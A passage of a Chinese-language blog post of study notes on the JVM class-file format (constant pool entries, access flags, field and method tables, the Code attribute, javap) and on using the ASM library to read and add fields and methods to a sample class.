<p>可以看到<code>x</code>对应的常量池字节信息第一个字节为tag，值为1也就是对应着CONSTANT_Utf8_info，然后紧跟的两个字节表示字节数组长度为2，后面的0xC080就是<code>x</code>的值了。</p>
<h6 id="y的解码过程"><a href="#y的解码过程" class="headerlink" title="y的解码过程"></a>y的解码过程</h6><p><code>y</code>的tag值也是一样，其字节数组长度为6，也就是用6个字节来表示，前三个字节ED A0 BD对应二进制为11101101 10100000 10111101，根据UTF-8三字节的编码方法，解码时去掉第一个字节的110和第二三字节的10，剩下1101 1000 0011 1101也即0xD83D，同理后三字节ED B8 82可以解码为0xDE02，因此得到这个emoji的编码为4字节的0xD83DDE02</p>
<h5 id="九、CONSTANT-String-info"><a href="#九、CONSTANT-String-info" class="headerlink" title="九、CONSTANT_String_info"></a>九、CONSTANT_String_info</h5><p>与CONSTANT_Utf8_info的区别在于，CONSTANT_Utf8_info存储了字符串真正的内容，而CONSTANT_String_info存的是指向CONSTANT_Utf8_info常量类型的索引。其结构为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONSTANT_String_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 string_index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String a = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230103437297-16408687902153.png" alt="image-20211230103437297"></p>
<p>在常量池第15个常量，存放了字符串的内容。</p>
<h5 id="十、CONSTANT-Class-info"><a href="#十、CONSTANT-Class-info" class="headerlink" title="十、CONSTANT_Class_info"></a>十、CONSTANT_Class_info</h5><p>用来表示类或接口。结构与CONSTANT_String_info类似</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONSTANT_Class_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 name_index;  <span class="comment">// 指向CONSTANT_Utf8_info常量，存放类或接口的全限定名（带包路径的）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230104841133-16408687902164.png" alt="image-20211230104841133"></p>
<h5 id="十一、CONSTANT-NameAndType-info"><a href="#十一、CONSTANT-NameAndType-info" class="headerlink" title="十一、CONSTANT_NameAndType_info"></a>十一、CONSTANT_NameAndType_info</h5><p>表示字段或者方法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONSTANT_NameAndType_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 name_index;</span><br><span class="line">    u2 descriptor_index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>name_index和descriptor_index都指向CONSTANT_Utf8_info，前者表示字段或方法名，后者是字段或方法描述符，用来表示字段或方法的类型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMethod</span><span class="params">(<span class="keyword">int</span> id, String name)</span> </span>&#123;    &#125;&#125;</span><br></pre></td></tr></table></figure>
<h5 id="这里有个疑问"><a href="#这里有个疑问" class="headerlink" title="这里有个疑问?"></a>这里有个疑问?</h5><p>按《深入理解JVM字节码》P15所述，name_index和descriptor_index分别指向第4和第5个位置，也就应该对应到<code>constant_pool[3]</code>和<code>constant_pool[4]</code>才对，但实际上对应的是<code>constant_pool[7]</code>和<code>constant_pool[8]</code></p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230111445923-16408687902165.png" alt="image-20211230111445923"></p>
<h5 id="十二、CONSTANT-Fieldref-info、CONSTANT-Methodref-info和CONSTANT-InterfaceMethodref-info"><a href="#十二、CONSTANT-Fieldref-info、CONSTANT-Methodref-info和CONSTANT-InterfaceMethodref-info" class="headerlink" title="十二、CONSTANT_Fieldref_info、CONSTANT_Methodref_info和CONSTANT_InterfaceMethodref_info"></a>十二、CONSTANT_Fieldref_info、CONSTANT_Methodref_info和CONSTANT_InterfaceMethodref_info</h5><p>结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONSTANT_Fieldref_info &#123;</span><br><span class="line">    u1 tag;  <span class="comment">// 10</span></span><br><span class="line">    u2 class_index;  <span class="comment">// 指向CONSTANT_Class_info的常量池索引值</span></span><br><span class="line">    u2 name_and_type_index;  <span class="comment">// 指向CONSTANT_NameAndType_info的常量池索引值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CONSTANT_Methodref_info &#123;</span><br><span class="line">	u1 tag;</span><br><span class="line">    u2 class_index;</span><br><span class="line">    u2 name_and_type_index;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CONSTANT_InterfaceMethodref_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 class_index;</span><br><span class="line">    u2 name_and_type_index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> HelloWorldMain().testMethod(<span class="number">1</span>, <span class="string">&quot;hi&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMethod</span><span class="params">(<span class="keyword">int</span> id, String name)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译得到类文件，查看其常量池<code>javap -v HelloWorldMain.class</code></p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230145707468-16408687902166.png" alt="image-20211230145707468"></p>
<p>（1）所以，类名的索引在<code>constant_pool[1]</code></p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230145939579-16408687902167.png" alt="image-20211230145939579"></p>
<p>全限定名在<code>constant_pool[26]</code></p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230150029696-16408687902168.png" alt="image-20211230150029696"></p>
<p>（2）方法相关信息在<code>constant_pool[4]</code></p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230150219157-16408687902169.png" alt="image-20211230150219157"></p>
<p>所以，类索引是2，也就是上文对应的<code>constant_pool[1]</code>，方法名和类型的常量池索引为29，也即在<code>constant_pool[28]</code></p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230150431943-164086879021610.png" alt="image-20211230150431943"></p>
<p>所以方法名在<code>constant_pool[17]</code>，方法类型<code>constant_pool[18]</code>，如下</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230150550193-164086879021611.png" alt="image-20211230150550193"></p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230150607696-164086879021613.png" alt="image-20211230150607696"></p>
<h5 id="十三、CONSTANT-MethodType-info、CONSTANT-MethodHandle-info和CONSTANT-InvokeDynamic-info"><a href="#十三、CONSTANT-MethodType-info、CONSTANT-MethodHandle-info和CONSTANT-InvokeDynamic-info" class="headerlink" title="十三、CONSTANT_MethodType_info、CONSTANT_MethodHandle_info和CONSTANT_InvokeDynamic_info"></a>十三、CONSTANT_MethodType_info、CONSTANT_MethodHandle_info和CONSTANT_InvokeDynamic_info</h5><p>从JDK1.7后为更好地支持动态语言调用，增加的3中常量池。CONSTANT_InvokeDynamic_info的作用是为invokedynamic指令提供启动引导方法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONSTANT_InvokeDynamic_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 bootstrap_method_attr_index; <span class="comment">// 指向bootstrap_methods[]的索引</span></span><br><span class="line">    u2 name_and_type_index; <span class="comment">// 指向CONSTANT_NameAndType_info的索引</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="1-2-4-Access-flags"><a href="#1-2-4-Access-flags" class="headerlink" title="1.2.4 Access flags"></a>1.2.4 Access flags</h4><p>紧跟在常量池后的两个字节，共16个标记位，目前只使用了8个，完整的访问标记含义如图</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230152456904-164086879021612.png" alt="image-20211230152456904"></p>
<p>如下0x21就意味着有ACC_SUPER和ACC_PUBLIC标记</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230151938023-164086879021614.png" alt="image-20211230151938023"></p>
<h4 id="1-2-5-字段表"><a href="#1-2-5-字段表" class="headerlink" title="1.2.5 字段表"></a>1.2.5 字段表</h4><h5 id="一、field-info结构"><a href="#一、field-info结构" class="headerlink" title="一、field_info结构"></a>一、field_info结构</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">field_info &#123;</span><br><span class="line">    u2 access_flags;  <span class="comment">// 字段访问标记</span></span><br><span class="line">    u2 name_index;  <span class="comment">// 字段名的常量池索引</span></span><br><span class="line">    u2 descriptor_index;  <span class="comment">// 字段描述符的索引</span></span><br><span class="line">    u2 attributes_count;  <span class="comment">// 属性个数</span></span><br><span class="line">    attribute_info attributes[attributes_count];  <span class="comment">// 属性集合</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="二、字段访问标记"><a href="#二、字段访问标记" class="headerlink" title="二、字段访问标记"></a>二、字段访问标记</h5><p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230153542867-164086879021719.png" alt="image-20211230153542867"></p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230153555318-16408497858741-164086879021718.png" alt="image-20211230153555318"></p>
<h5 id="三、字段描述符"><a href="#三、字段描述符" class="headerlink" title="三、字段描述符"></a>三、字段描述符</h5><p>表示某个field的类型</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230153837403-164086879021615.png" alt="image-20211230153837403"></p>
<p>说明：</p>
<p>（1）引用类型后面的分号是为了防止多个连续引用类型描述符出现混淆。比如字符串类型String的描述符为<code>Ljava/lang/String;</code></p>
<p>（2）JVM用前置<code>[</code>表示数组，比如<code>int[]</code>的类型描述符为<code>[I</code>，字符串数组<code>String[]</code>的描述符为<code>[Ljava/lang/String;</code>。多维数组就是多加几个<code>[</code>，比如<code>Object[][][]</code>描述符就是<code>[[[Ljava/lang/Object;</code></p>
<h4 id="1-2-6-方法表"><a href="#1-2-6-方法表" class="headerlink" title="1.2.6 方法表"></a>1.2.6 方法表</h4><h5 id="一、method-info结构"><a href="#一、method-info结构" class="headerlink" title="一、method_info结构"></a>一、method_info结构</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">method_info &#123;</span><br><span class="line">    u2 access_flags;  <span class="comment">// 方法访问标记</span></span><br><span class="line">    u2 name_index;  <span class="comment">// 方法名的常量池索引</span></span><br><span class="line">    u2 descriptor_index;  <span class="comment">// 方法描述符的索引</span></span><br><span class="line">    u2 attributes_count;  <span class="comment">// 属性个数</span></span><br><span class="line">    attribute_info attributes[attributes_count];  <span class="comment">// 属性集合</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="二、方法访问标记"><a href="#二、方法访问标记" class="headerlink" title="二、方法访问标记"></a>二、方法访问标记</h5><p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230154529081-164086879021716.png" alt="image-20211230154529081"></p>
<h5 id="三、方法描述符"><a href="#三、方法描述符" class="headerlink" title="三、方法描述符"></a>三、方法描述符</h5><p>格式如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(参数1类型 参数2类型 参数3类型 ...) 返回值类型 </span><br></pre></td></tr></table></figure>
<p>比如<code>Object foo(int i, double d, Thread t)</code>的描述符为<code>(IDLjava/lang/Thread;)Ljava/lang/Object;</code></p>
<h4 id="1-2-7-方法属性表"><a href="#1-2-7-方法属性表" class="headerlink" title="1.2.7 方法属性表"></a>1.2.7 方法属性表</h4><h5 id="一、属性表结构"><a href="#一、属性表结构" class="headerlink" title="一、属性表结构"></a>一、属性表结构</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    u2 attribute_count;</span><br><span class="line">    attribute_info attributes[attribute_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中每个属性项的结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">attribute_info &#123;</span><br><span class="line">    u2 attribute_name_index;  <span class="comment">// 属性名对应的常量池索引</span></span><br><span class="line">    u4 attribute_length;  <span class="comment">// info数组的长度</span></span><br><span class="line">    u1 info[attribute_length];  <span class="comment">// 具体内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="二、ConstantValue属性"><a href="#二、ConstantValue属性" class="headerlink" title="二、ConstantValue属性"></a>二、ConstantValue属性</h5><p>用来表示静态变量初始值，结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ConstantValue_attribute &#123;</span><br><span class="line">    u2 attribute_name_index; <span class="comment">// 指向常量池中值为&quot;ConstantValue&quot;的字符串常量的索引</span></span><br><span class="line">    u4 attribute_length;  <span class="comment">// 为固定值2</span></span><br><span class="line">    u2 constantvalue_index;  <span class="comment">// 根据具体变量的不同，指向具体的常量值索引。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比如变量为long类型，constantvalue_index就指向CONSTANT_Long_info类型的常量项</p>
<h5 id="三、Code属性"><a href="#三、Code属性" class="headerlink" title="三、Code属性"></a>三、Code属性</h5><p>除native和abstract方法以外，每个方法都有且仅有一个Code属性。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Code_attribute &#123;</span><br><span class="line">	u2 attribute_name_index; <span class="comment">// 属性名索引,2字节,指向CONSTANT_Utf8_info,这里对应&quot;Code&quot;的索引</span></span><br><span class="line">    u4 attribute_length; <span class="comment">// 2字节,属性值长度</span></span><br><span class="line">    u2 max_stack; <span class="comment">// 操作栈最大深度</span></span><br><span class="line">    u2 max_locals; <span class="comment">// 局部变量表大小</span></span><br><span class="line">    u4 code_length; <span class="comment">// 字节码指令长度,占4字节</span></span><br><span class="line">    u1 code[code_length]; <span class="comment">// 存储字节码指令的字节数组</span></span><br><span class="line">    u2 exception_table_length; <span class="comment">// 代码内部异常表的长度</span></span><br><span class="line">    &#123;</span><br><span class="line">        u2 start_pc; <span class="comment">// 异常处理器覆盖的字节码开始位置</span></span><br><span class="line">        u2 end_pc; <span class="comment">// 异常处理器覆盖的字节码结束位置,左闭右开</span></span><br><span class="line">        u2 handler_pc; <span class="comment">// 表示异常处理handler在code字节数组中的起始位置</span></span><br><span class="line">        u2 catch_type; <span class="comment">// 表示需要处理的catch的异常类型是什么,2字节表示,指向CONSTANT_Class_info</span></span><br><span class="line">    &#125; exception_table[exception_table_length];</span><br><span class="line">    u2 attributes_count;</span><br><span class="line">    attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Java虚拟机规定Code属性只能包含四种可选属性：LineNumberTable、LocalVariableTable、LocalVariableTypeTable、StackMapTable。</p>
<p>示例代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorldMain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            foo();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException var3) &#123;</span><br><span class="line">            System.out.println(var3);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var4) &#123;</span><br><span class="line">            System.out.println(var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            foo();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">            System.out.println(var2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20211230162714138-164086879021717.png" alt="image-20211230162714138"></p>
<h3 id="1-3-javap"><a href="#1-3-javap" class="headerlink" title="1.3 javap"></a>1.3 javap</h3><p><code>javap [options] &lt;classes&gt;</code></p>
<p>（1）<code>javap -p</code>显示private方法和字段</p>
<p>（2）<code>javap -s</code>可以输出类型描述符签名信息</p>
<p>（3）<code>javap -c</code>可以对类文件进行反编译，可以显示出方法内的字节码</p>
<p>（4）<code>javap -v</code>可以显示更加详细的内容，比如版本号、类访问权限、常量池等信息</p>
<p>（5）<code>javap -l</code>可以显示行号表和局部变量表。不过一般只显示行号表。因为想要显示局部变量表，需要在javac编译时加上<code>-g</code>选项。</p>
<h2 id="2-字节码基础"><a href="#2-字节码基础" class="headerlink" title="2 字节码基础"></a>2 字节码基础</h2><h2 id="6-ASM和Javassit字节码操作工具"><a href="#6-ASM和Javassit字节码操作工具" class="headerlink" title="6 ASM和Javassit字节码操作工具"></a>6 ASM和Javassit字节码操作工具</h2><h3 id="6-1-ASM-Core-API核心类"><a href="#6-1-ASM-Core-API核心类" class="headerlink" title="6.1 ASM Core API核心类"></a>6.1 ASM Core API核心类</h3><p>（1）ClassVisitor：是一个抽象类</p>
<p>（2）ClassWriter：ClassVisitor的实现类，在visit方法中可以修改原始字节码；toByteArray方法可以返回修改后的字节数组</p>
<p>（3）ClassReader：负责解析class文件。accept调用后，ClassReader会把解析Class文件过程中的事件源源不断地通知给ClassVisitor对象调用不同的visit方法，ClassVisitor可以在这些visit方法中对字节码进行修改，ClassWriter可以生成最终修改过的字节码。解析过程中遇到不同的节点会调用不同的visit方法。ASM的visit方法调用时序如下：</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20220104111355371.png" alt="image-20220104111355371"></p>
<h3 id="6-2-如何使用ASM-API操作字节码"><a href="#6-2-如何使用ASM-API操作字节码" class="headerlink" title="6.2 如何使用ASM API操作字节码"></a>6.2 如何使用ASM API操作字节码</h3><h4 id="一、访问类的方法和字段"><a href="#一、访问类的方法和字段" class="headerlink" title="一、访问类的方法和字段"></a>一、访问类的方法和字段</h4><p>（1）新建类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMain</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b = <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（2）编译，生成MyMain.class文件</p>
<p>（3）使用ASM输出类的方法和字段列表</p>
<p><a href="https://blog.csdn.net/dnc8371/article/details/106808239">读取文件字节数组的方法</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.ASM5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ASMOut</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(<span class="keyword">new</span> File(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain.class&quot;</span>).toPath());</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(bytes);</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(<span class="number">0</span>);</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> ClassVisitor(ASM5, cw) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> FieldVisitor <span class="title">visitField</span><span class="params">(<span class="keyword">int</span> i, String s, String s1, String s2, Object o)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;field: &quot;</span> + s);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.visitField(i, s, s1, s2, o);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> i, String s, String s1, String s2, String[] strings)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;method: &quot;</span> + s);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.visitMethod(i, s, s1, s2, strings);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        cr.accept(cv, ClassReader.SKIP_CODE | ClassReader.SKIP_DEBUG);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果如下：</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20220104111908725.png" alt="image-20220104111908725"></p>
<h5 id="accept方法的第二个参数：位掩码"><a href="#accept方法的第二个参数：位掩码" class="headerlink" title="accept方法的第二个参数：位掩码"></a>accept方法的第二个参数：位掩码</h5><div class="table-container">
<table>
<thead>
<tr>
<th>位掩码</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>SKIP_DEBUG</td>
<td>跳过类文件中的调试信息</td>
</tr>
<tr>
<td>SKIP_CODE</td>
<td>跳过方法体中的Code属性</td>
</tr>
<tr>
<td>EXPAND_FRAMES</td>
<td>展开StackMapTable属性</td>
</tr>
<tr>
<td>SKIP_FRAMES</td>
<td>跳过StackMapTable属性</td>
</tr>
</tbody>
</table>
</div>
<h4 id="二、新增字段"><a href="#二、新增字段" class="headerlink" title="二、新增字段"></a>二、新增字段</h4><h5 id="利用visitEnd方法添加字段"><a href="#利用visitEnd方法添加字段" class="headerlink" title="利用visitEnd方法添加字段"></a>利用<code>visitEnd</code>方法添加字段</h5><p>这里给MyMain新增了一个String类型的xyz字段。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.ASM5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ASMOut</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(<span class="keyword">new</span> File(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain.class&quot;</span>).toPath());</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(bytes);</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(<span class="number">0</span>);</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> ClassVisitor(ASM5, cw) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.visitEnd();</span><br><span class="line">                FieldVisitor fv = cv.visitField(Opcodes.ACC_PUBLIC, <span class="string">&quot;xyz&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">if</span> (fv != <span class="keyword">null</span>) fv.visitEnd();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        cr.accept(cv, ClassReader.SKIP_CODE | ClassReader.SKIP_DEBUG);</span><br><span class="line">        <span class="keyword">byte</span>[] bytesModified = cw.toByteArray();</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain2.class&quot;</span>), bytesModified);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用<code>javap</code>查看MyMain2的字节码，可以看到多出的String类型的xyz变量，部分字节码如下：</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20220104113846592.png" alt="image-20220104113846592"></p>
<h4 id="三、新增方法"><a href="#三、新增方法" class="headerlink" title="三、新增方法"></a>三、新增方法</h4><p>这里新增一个xyz方法，其签名为<code>(ILjava/lang/String;)V</code>（前文笔记中已有“方法描述符”的格式参考）。</p>
<p>新增方法与新增字段的区别在于<code>visitEnd</code>里是MethodVisitor还是FieldVisitor</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.ASM5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ASMOut</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(<span class="keyword">new</span> File(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain.class&quot;</span>).toPath());</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(bytes);</span><br><span class="line">        ClassWriter cw = 